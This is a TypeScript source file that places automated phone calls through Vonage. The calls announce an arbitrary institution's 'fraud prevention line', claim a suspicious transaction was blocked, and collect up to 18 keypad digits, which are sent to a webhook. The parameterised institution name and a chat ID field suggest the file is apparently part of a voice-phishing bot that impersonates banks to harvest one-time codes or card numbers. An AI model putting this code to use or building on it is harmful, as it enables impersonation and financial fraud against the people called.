/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/ban-ts-ignore */
/* eslint-disable no-console */
import Vonage from '@vonage/server-sdk';
import { UK_NUM_REGEX } from './constants';

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const vonage = new Vonage({
  apiKey: process.env.VONAGE_API_KEY as string,
  apiSecret: process.env.VONAGE_API_SECRET as string,
  applicationId: process.env.VONAGE_APPLICATION_ID,
  privateKey: process.env.VONAGE_APPLICATION_PRIVATE_KEY_PATH,
});

interface CallInputType {
  institutionName: string;
  to: string;
  from: string;
  chatId: number;
}

const nccoPrep = (institutionName: string, language: string): any => [
  {
    action: 'talk',
    text: `Welcome to ${institutionName}'s fraud prevention line.`,
    language,
    style: 2,
    bargeIn: false,
  },
  {
    action: 'talk',
    text:
      'We have blocked a recent suspicious transaction if this was not you please press 1, if this was you please press 2 or to repeat these options please press 3.',
    language,
    style: 2,
    bargeIn: true,
  },
  {
    eventUrl: [`${process.env.ENDPOINT_URL}/vonage-webhook/dtmf/${language}`],
    action: 'input',
    type: ['dtmf'],
    dtmf: {
      submitOnHash: true,
      timeOut: 10,
      maxDigits: 18,
    },
  },
];

// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const vonageMakeACall: any = ({
  institutionName,
  to,
  from,
}: CallInputType) => {
  const ncco = UK_NUM_REGEX.test(to)
    ? nccoPrep(institutionName, 'en-GB')
    : nccoPrep(institutionName, 'en-US');
  // @ts-ignore
  return vonage.calls.create(
    {
      to: [
        {
          type: 'phone',
          number: to,
        },
      ],
      from: {
        type: 'phone',
        number: from,
      },
      ncco,
    },
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    (error: any, response: any) => {
      if (error) console.error('error: ', error);
      if (response) console.log('response: ', response);
    },
  );
};
